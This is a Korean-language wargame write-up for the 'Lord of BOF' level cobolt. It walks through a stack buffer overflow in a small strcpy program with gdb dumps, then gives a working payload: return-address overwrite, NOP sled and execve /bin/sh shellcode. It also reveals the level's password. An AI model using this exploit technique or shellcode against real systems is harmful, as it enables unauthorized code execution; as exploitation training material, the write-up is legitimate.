# [WriteUp]The Lord of BOF - gremlin → cobolt

:black_nib:ChyKor12(sjjo0225@gmail.com)

---

```bash
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

`gremlin.c`와 비슷하게 생겼지만 이번에는 버퍼의 크기가 쉘코드를 담을 수 없을 만큼 작다. 그냥 리턴 어드레스보다 높은 주소에 쉘코드를 넣으면 된다.

`main()`에서 `strcpy`가 실행된 직후에 break point를 걸고 메모리의 상태를 살펴보자.

```bash
(gdb) r AAAAAAAA
Starting program: /tmp/cobolt AAAAAAAA

Breakpoint 1, 0x8048465 in main ()
(gdb) x/80wx $esp
0xbffffce0:	0xbffffce8	0xbffffe42	0x41414141	0x41414141
0xbffffcf0:	0x08049400	0x08049500	0xbffffd18	0x400309cb
0xbffffd00:	0x00000002	0xbffffd44	0xbffffd50	0x40013868
0xbffffd10:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffd20:	0x08048430	0x00000002	0xbffffd44	0x080482e0
0xbffffd30:	0x080484ac	0x4000ae60	0xbffffd3c	0x40013e90
0xbffffd40:	0x00000002	0xbffffe36	0xbffffe42	0x00000000
0xbffffd50:	0xbffffe4b	0xbffffe6d	0xbffffe77	0xbffffe85
0xbffffd60:	0xbffffea4	0xbffffeb4	0xbffffece	0xbffffeeb
0xbffffd70:	0xbffffeff	0xbfffff0d	0xbfffff50	0xbfffff63
0xbffffd80:	0xbfffff78	0xbfffff88	0xbfffff95	0xbfffffb4
0xbffffd90:	0xbfffffc5	0xbfffffd0	0xbfffffdd	0xbfffffe5
0xbffffda0:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffdb0:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffdc0:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffdd0:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffde0:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffdf0:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffe00:	0x0f8bfbff	0x0000000f	0xbffffe31	0x00000000
0xbffffe10:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) info register ebp
ebp            0xbffffcf8	-1073742600
```

리턴 어드레스의 실제 주소를 확인하기 위해서 BOF를 발생시켜서 `core` 파일을 디버깅해보자.

```bash
[gremlin@localhost /tmp]$ ./cobolt AAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost /tmp]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobolt AAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/20wx $esp-0x20
0xbffffcc0:	0x080484dc	0xbffffcc8	0x41414141	0x41414141
0xbffffcd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffce0:	0x41414141	0xbffffd00	0xbffffd30	0x40013868
0xbffffcf0:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffd00:	0x08048430	0x00000002	0xbffffd24	0x080482e0
```

리턴 어드레스는 적당히 `0xbffffd10` 정도로 덮으면 될 것 같다.

payload: dummy(`0x14`byte) + return address(`0xbffffd10`) + NOP sled(`0x1000`byte) + shellcode(`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80`)

```bash
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*0x14+"\x10\xfd\xff\xbf"+"\x90"*0x1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
�����������������������������������������������������...

bash$ whoami 
cobolt
bash$ my-pass
euid = 502
hacking exposed
```
